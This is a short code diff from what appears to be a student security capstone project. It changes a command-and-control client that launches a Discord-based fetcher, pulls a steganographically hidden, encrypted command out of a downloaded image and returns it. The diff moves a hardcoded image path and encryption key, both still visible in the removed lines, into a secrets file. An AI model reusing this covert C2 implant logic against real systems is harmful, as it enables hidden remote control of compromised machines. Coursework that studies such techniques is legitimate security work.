@@ -9,10 +9,12 @@ from os.path import exists
 import os
 
 import time
+import json
 import sys
 
-IMAGE_DOWNLOAD_PATH = './secret_img/downloaded.png'
-ENCRYPTION_KEY = b'dM22m7nTndj8WjFatZ_1CPDsyboSUwjHrL-_w4acHjY='
+f = open('secrets.json')
+secrets = json.load(f)
+
 SLEEP_TIME = 5
 
 def extract_message(image):
@@ -28,10 +30,10 @@ def unwrap_command(embedded_command, key):
     return command
 
 def fetch_command():
-    os.system('C:/Users/Andrew/AppData/Local/Microsoft/WindowsApps/python3.9.exe c:/Users/Andrew/Desktop/CS590J/Capstone/c2_discord.py')
-    if exists(IMAGE_DOWNLOAD_PATH):
-        command = unwrap_command(IMAGE_DOWNLOAD_PATH, ENCRYPTION_KEY)
-        os.remove(IMAGE_DOWNLOAD_PATH)
+    os.system('python3 ./c2_discord.py')
+    if exists(secrets["IMAGE_DOWNLOAD_PATH"]):
+        command = unwrap_command(secrets["IMAGE_DOWNLOAD_PATH"], secrets["ENCRYPTION_KEY"])
+        os.remove(secrets["IMAGE_DOWNLOAD_PATH"])
     else:
         command = None
     return command
